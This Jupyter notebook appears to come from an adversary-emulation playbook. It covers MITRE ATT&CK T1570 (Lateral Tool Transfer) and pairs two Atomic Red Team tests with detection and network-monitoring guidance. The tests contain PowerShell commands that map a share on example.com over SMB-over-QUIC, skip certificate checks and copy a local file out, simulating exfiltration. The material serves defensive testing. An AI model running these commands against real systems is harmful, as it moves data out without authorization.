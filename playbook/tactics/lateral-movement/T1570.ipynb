{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8d47348c",
   "metadata": {},
   "source": "# T1570 - Lateral Tool Transfer\nAdversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)"
  },
  {
   "cell_type": "markdown",
   "id": "5eee839c",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "db722eae",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Exfiltration Over SMB over QUIC (New-SmbMapping)",
    "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck\ncopy 'C:\\path\\to\\file.txt' 'Z:\\'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6594cbc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1570 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1599b43a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Exfiltration Over SMB over QUIC (NET USE)",
    "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy 'C:\\path\\to\\file.txt' '*:\\'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0420e261",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1570 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d59d1dad",
   "metadata": {},
   "source": "## Detection\nMonitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts."
  },
  {
   "cell_type": "markdown",
   "id": "519b8018",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Network Monitoring \n Monitor network traffic in order to detect adversary activity. \n\n Network monitoring involves capturing network activity data, including capturing of server, firewall, and other relevant logs. A defender can then review them or send them to a centralized collection location for further analysis.\n#### Opportunity\nThere is an opportunity to monitor network traffic for different protocols, anomalous traffic patterns, transfer of data, etc. to determine the presence of an adversary.\n#### Use Case\nThe defender can implement network monitoring for and alert on  anomalous traffic patterns, large  or unexpected data transfers, and other activity that may reveal the presence of an adversary.\n#### Procedures\nCapture network logs for internet-facing devices and send those logs to a central collection location.\nCapture all network  device (router, switches, proxy, etc.) logs on a decoy network and send those logs to a central collection location.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}